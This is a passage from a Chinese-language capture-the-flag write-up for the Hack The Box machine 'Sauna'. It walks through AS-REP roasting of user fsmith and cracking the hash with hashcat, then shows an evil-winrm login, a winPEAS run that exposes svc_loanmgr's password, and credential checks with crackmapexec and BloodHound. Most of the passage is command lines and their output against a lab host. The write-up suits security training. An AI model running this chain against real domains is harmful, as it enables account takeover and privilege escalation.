+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>爆破出用户 <code>fsmith</code> 有预认证。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-user_hash.txt" data-lang="user_hash.txt"><span style="display:flex;"><span>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6850f382cf535713343eed5dbe5945c8$c2fec4b43dbe3c498656c0edf0eace0879bd78887fe37115ff8ba01a39d192493a509d39cc4fa07dc9ded63189241a679ad645ab2b2fb2317cbf98788bd3873912914866b758ad680f04e8adbff310443eab1f96c80b794a7233c1f13b19b0a23b2fe90f831ae1c67573f419b3a3b134b143418b63236f508571a2540141907b3777e161dcca098d2a979b40b7bd4a7b37c0cae71ca16ef3025f9aa694c526c78b4d0cfb4310d8f33ac839aaa88b590ed4440413405cc0a245ccb5d45f80c3e248d4152f732dc3f15c57fec6478098e0dab8758d2238b4fe17b447929b6a9e0c72243f4eb9acac868833dadbebd9982812be7c73c93d1b5de2e673cfbef5d72c
+</span></span><span style="display:flex;"><span>$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:acb677509f6d56992b59b00a1392c82a$0b08ccc1c3b03aac2406adc5e2910ab4c07608cc436352ac232576b8a3499ac11e62ecb39ac813ec5ef7ccc2e5a31e9a62d5a30e5e94700d06db7c55d166fb7cec8643c21e473e2ba70106e5a49ec5a6d34fa81c0d323cc26a023c6862fc4fdecf88b4171d0340bb791693dfae2f5776a532ec4f21fb8164a2b9281c648f85a6e632de45ee94dea5c06946bc83ae0fb80ca28a275f99dcdc95c7ce1b93358e233007ed51fab20a6fd49aee131227f4a5ca4fb92e60483fa10146e1ad01e31356f19455d6f992522d56d34aea97a61fbf0dd4ed037a0c2756c935eb6bd5cffc7b7b8603180c80289ef77d43d39c448575088eb512043e2e4afa1a27390b2bdd08
+</span></span><span style="display:flex;"><span>$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:f40036799fd7669bfb8836b1b0706fd3$4f27a188189e6b40ce0ca6dd52339904c73383352ee22614a8c02b4d1fd2e7273b14951d0ac9a4b9bc1a1e2b0a85a4b558570875e747012742f79d6386afd0c4d8e89b875909db9901c3621232eb25ecb9630461ded0fc60864046367ace58f89842b0d8b3061e186a17a72c9e0d671ce4a4632d6d412649a57b0a8b3d93bdeab13e928d8777213c418cd01a1a85a3e55c7702653f80fc9a8113bdaa8dfd15fe74ca919eeaba144c4bde9b81eef1f1e60e04829114a82de8a850ebcaa743d4740fb4c00a299bfbbc5726b95bb209c364fce2690b89de08ac611008f1061da99b615b37f8125398b85d8394c70078b143d680b5ff450e14b6f297032e77cf0cde
+</span></span></code></pre></div><p>使用 hashcat 爆破密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">18200</span> user_hash.txt /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v7.1.2<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">====================================================================================================================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>Minimum salt length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum salt length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">3</span> digests; <span style="color:#ae81ff">3</span> unique digests, <span style="color:#ae81ff">3</span> unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Optimizers applied:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Not-Iterated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory allocated <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">514</span> MB <span style="color:#f92672">(</span><span style="color:#ae81ff">27419</span> MB free<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache hit:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:acb677509f6d56992b59b00a1392c82a$0b08ccc1c3b03aac2406adc5e2910ab4c07608cc436352ac232576b8a3499ac11e62ecb39ac813ec5ef7ccc2e5a31e9a62d5a30e5e94700d06db7c55d166fb7cec8643c21e473e2ba70106e5a49ec5a6d34fa81c0d323cc26a023c6862fc4fdecf88b4171d0340bb791693dfae2f5776a532ec4f21fb8164a2b9281c648f85a6e632de45ee94dea5c06946bc83ae0fb80ca28a275f99dcdc95c7ce1b93358e233007ed51fab20a6fd49aee131227f4a5ca4fb92e60483fa10146e1ad01e31356f19455d6f992522d56d34aea97a61fbf0dd4ed037a0c2756c935eb6bd5cffc7b7b8603180c80289ef77d43d39c448575088eb512043e2e4afa1a27390b2bdd08:Thestrokes23
+</span></span><span style="display:flex;"><span>$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:f40036799fd7669bfb8836b1b0706fd3$4f27a188189e6b40ce0ca6dd52339904c73383352ee22614a8c02b4d1fd2e7273b14951d0ac9a4b9bc1a1e2b0a85a4b558570875e747012742f79d6386afd0c4d8e89b875909db9901c3621232eb25ecb9630461ded0fc60864046367ace58f89842b0d8b3061e186a17a72c9e0d671ce4a4632d6d412649a57b0a8b3d93bdeab13e928d8777213c418cd01a1a85a3e55c7702653f80fc9a8113bdaa8dfd15fe74ca919eeaba144c4bde9b81eef1f1e60e04829114a82de8a850ebcaa743d4740fb4c00a299bfbbc5726b95bb209c364fce2690b89de08ac611008f1061da99b615b37f8125398b85d8394c70078b143d680b5ff450e14b6f297032e77cf0cde:Thestrokes23
+</span></span><span style="display:flex;"><span>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6850f382cf535713343eed5dbe5945c8$c2fec4b43dbe3c498656c0edf0eace0879bd78887fe37115ff8ba01a39d192493a509d39cc4fa07dc9ded63189241a679ad645ab2b2fb2317cbf98788bd3873912914866b758ad680f04e8adbff310443eab1f96c80b794a7233c1f13b19b0a23b2fe90f831ae1c67573f419b3a3b134b143418b63236f508571a2540141907b3777e161dcca098d2a979b40b7bd4a7b37c0cae71ca16ef3025f9aa694c526c78b4d0cfb4310d8f33ac839aaa88b590ed4440413405cc0a245ccb5d45f80c3e248d4152f732dc3f15c57fec6478098e0dab8758d2238b4fe17b447929b6a9e0c72243f4eb9acac868833dadbebd9982812be7c73c93d1b5de2e673cfbef5d72c:Thestrokes23
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">18200</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, AS-REP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: user_hash.txt
+</span></span><span style="display:flex;"><span>Time.Started.....: Tue Apr <span style="color:#ae81ff">21</span> 06:05:02 <span style="color:#ae81ff">2026</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Tue Apr <span style="color:#ae81ff">21</span> 06:05:10 <span style="color:#ae81ff">2026</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel <span style="color:#f92672">(</span>password length 0-256 bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#01........:  3923.2 kH/s <span style="color:#f92672">(</span>1.57ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 3/3 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 3/3 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>, 3/3 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Salts
+</span></span><span style="display:flex;"><span>Progress.........: 31629312/43033155 <span style="color:#f92672">(</span>73.50%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/31629312 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 10534912/14344385 <span style="color:#f92672">(</span>73.44%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#01..: Salt:2 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#01...: Tioncurtis23 -&gt; Teague51
+</span></span><span style="display:flex;"><span>Hardware.Mon.#01.: Util: 56%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Tue Apr <span style="color:#ae81ff">21</span> 06:04:59 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>Stopped: Tue Apr <span style="color:#ae81ff">21</span> 06:05:11 <span style="color:#ae81ff">2026</span>
+</span></span></code></pre></div><p>爆破出密码为 <code>Thestrokes23</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i egotistical-bank.local -u fsmith -p <span style="color:#e6db74">&#39;Thestrokes23&#39;</span>
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#e6db74">&#39; for module Reline
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Info: Establishing connection to remote endpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; whoami
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">egotisticalbank\fsmith
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; gci c:\Users\ -Filter *.txt -File -Recurse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Access to the path &#39;</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#e6db74">&#39; is denied.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">At line:1 char:1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+ gci c:\Users\ -Filter *.txt -File -Recurse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Directory: C:\Users\FSmith\Desktop
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Mode                LastWriteTime         Length Name
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">----                -------------         ------ ----
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-ar---        4/21/2026   9:18 AM             34 user.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Access to the path &#39;</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#e6db74">&#39; is denied.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">At line:1 char:1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+ gci c:\Users\ -Filter *.txt -File -Recurse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    + CategoryInfo          : PermissionDenied: (C:\Users\Public:String) [Get-ChildItem], UnauthorizedAccessException
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Access to the path &#39;</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_loanmgr<span style="color:#960050;background-color:#1e0010">&#39;</span> is denied.
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ gci c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\ </span>-Filter *.txt -File -Recurse
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_loanmgr:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Get-ChildItem<span style="color:#f92672">]</span>, UnauthorizedAccessException
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+</span></span></code></pre></div><p>找到 user flag。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\F</span>Smith<span style="color:#ae81ff">\D</span>ocuments&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\F</span>Smith<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt
+</span></span><span style="display:flex;"><span>c35a02c3c891654*******ea2039be3f
+</span></span></code></pre></div><h2 id="windows-提权">Windows 提权</h2>
+<p>准备好 <code>winPEAS.exe</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah winPEAS.exe  
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2768940</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 9.7M Apr <span style="color:#ae81ff">21</span> 06:17 winPEAS.exe
+</span></span></code></pre></div><p>传至靶机并执行，保存结果。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; .<span style="color:#ae81ff">\w</span>inPEAS.exe log
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;log&#34;</span> argument present, redirecting output to file <span style="color:#e6db74">&#34;out.txt&#34;</span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        4/21/2026  11:05 AM         <span style="color:#ae81ff">127766</span> out.txt
+</span></span></code></pre></div><p>发现 <code>svc_loanmanager</code> 暴露了明文密码。</p>
+<p><img src="Pasted%20image%2020260421212631.png" alt=""></p>
+<p>验证凭据，登入失败。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ crackmapexec smb 10.129.22.120 -u svc_loanmanager -p <span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.22.120   <span style="color:#ae81ff">445</span>    SAUNA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SAUNA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:EGOTISTICAL-BANK.LOCAL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.22.120   <span style="color:#ae81ff">445</span>    SAUNA            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmanager:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p>继续阅读 Winpeas 的结果发现用户实际为 <code>svc_loanmgr</code>。</p>
+<p><img src="Pasted%20image%2020260421212840.png" alt=""></p>
+<p>再次验证，成功。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ crackmapexec smb 10.129.22.120 -u svc_loanmgr -p <span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.22.120   <span style="color:#ae81ff">445</span>    SAUNA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SAUNA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:EGOTISTICAL-BANK.LOCAL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.22.120   <span style="color:#ae81ff">445</span>    SAUNA            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:Moneymakestheworldgoround!
+</span></span></code></pre></div><p>使用 bloodhound 收集信息。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodhound-python -c All -u svc_loanmgr -p <span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span> -ns 10.129.22.120 -d egotistical-bank.local --zip                                                                                                                                
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: egotistical-bank.local
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of <span style="color:#ae81ff">4</span> bytes
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
+</span></span><span style="display:flex;"><span>INFO: Testing resolved hostname connectivity dead:beef::1908:2eaa:e194:5ea5
+</span></span><span style="display:flex;"><span>INFO: Trying LDAP connection to dead:beef::1908:2eaa:e194:5ea5
+</span></span><span style="display:flex;"><span>INFO: Testing resolved hostname connectivity dead:beef::8b
+</span></span><span style="display:flex;"><span>INFO: Trying LDAP connection to dead:beef::8b
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
+</span></span><span style="display:flex;"><span>INFO: Testing resolved hostname connectivity dead:beef::1908:2eaa:e194:5ea5
+</span></span><span style="display:flex;"><span>INFO: Trying LDAP connection to dead:beef::1908:2eaa:e194:5ea5
+</span></span><span style="display:flex;"><span>INFO: Testing resolved hostname connectivity dead:beef::8b
+</span></span><span style="display:flex;"><span>INFO: Trying LDAP connection to dead:beef::8b
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">7</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">52</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">3</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 30S
